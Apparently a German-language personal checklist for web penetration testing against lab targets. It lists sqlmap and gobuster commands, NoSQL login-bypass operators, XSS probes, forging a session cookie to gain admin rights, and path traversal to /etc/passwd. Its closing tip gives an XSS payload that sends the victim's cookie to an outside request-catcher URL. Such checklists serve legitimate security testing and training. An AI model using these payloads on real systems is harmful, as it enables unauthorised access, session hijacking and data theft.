## Checkliste Web-Pentesting
1. Passive & Active Scan mit OWASP ZAP / Mit Authentication und Proxy

2. Nach SQLi suchen
	- sqlmap
	`sqlmap.py -u [POST-GET-URL] --dbs`
	
	- Zeichen Injection
	`'` `;` `&&`
	[SQLi Cheat Sheet (1)](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
	[SQLi Cheat Sheet (2)](https://portswigger.net/web-security/sql-injection/cheat-sheet)

	- No-SQL-Attack-Suite
	`python3 nosql-login-bypass.py -t [POST-URL] -u customer0 -p compass`
	
	- NoSQLi Bypass Login
	`{"$ne": 0}`
	`{"$ne": -1}`
	`{"$gt":""}`

3. Nach XSS-Schwachstellen suchen
	- Manuelle Injection mit `<script>alert("XSS");</script>`
	- Automatisierte Injection mit [traxss](https://www.geeksforgeeks.org/traxss-automated-xss-vulnerability-scanner/)
	`python3 traxss.py`
	`python3 xsstrike.py -u [URL]`

4. Session Cookie admin flag prüfen
	- Session Cookies beginnen meist mit `ey`
	- Cookiename behinhaltet meistens Session
	- In ZAP nach Login das Session Cookie abrufen / Oder in Browser Console
	![[CleanShot 2022-09-28 at 09.55.23.png]]
	- Prüfen ob Session Cookie einfach verschlüsselt ist ([CyberChef](https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')))	
	- Wenn Session Cookie entschlüsselbar versuchen admin Flag zu setzen
		- Meist `role:user` > `role:admin`  oder `admin:0` > `admin:1` 
	- Session Cookie über Browser Console eingeben oder direkt im Storage teil editieren `document.cookie="_sess=eyJ1c2VybmFtZSI6ImxlZXRoYWNrZXIiLCJhZG1pbiI6MX0="`
	![[CleanShot 2022-10-27 at 20.34.55.png]]

5. Mit dirbuster / gobuster Website auf versteckte Verzeichnise Scannen 
	`dirb [URL] [WORDLIST]`
	`gobuster dir -u [URL] -w [WORDLIST]`

6. Testen ob Seiten existieren
	- 403 / 404 kann Hinweis geben ob Seite existiert oder nicht (Beispiel ob User-Profil existiert oder nicht)

7. HTML Source Code checken
	- Kommentare mit Test Username / Links
	- Eingesetzte Software (-version)

8. URL prüfen
	- URL manipulieren. Beispiel ID ändern:
		`http://localhost:2501/updateblog?id=7`
	
	- POST-URL manipulieren
		![[CleanShot 2022-10-26 at 21.13.50.png]]
	
	- Path Traversal / Local file Inclusion (Auf versteckte Dateien prüfen)
	`http://localhost:2501/../../../../../../../etc/passwd`
	`http://localhost:2501/app.php?page=../../../../../../etc/passwd`

9. Berechtigung auf Unterseiten testen
	- Testen ob der Zugriff auf gewisse URLs auch als nicht berechtigter User oder Besucher funktioniert

10. Testen auf Fehlermeldungen
	- Zuviele Details in Fehlermeldungen können als Sicherheitslücke bewertet werden

## Tipps
- Persisten Log in Browser Network Console aktivieren
![[CleanShot 2022-10-13 at 20.32.05.png]]

- Session Cookie in Browser ändern (Browser Tools > Storage > Nach "session" suchen)
![[CleanShot 2022-10-30 at 20.00.46.png]]

- Cookie an Request Catcher senden (XSS)
```
`<script>document.location="[URL-Request-Catcher]?cookie=" + document.cookie;</script>`
```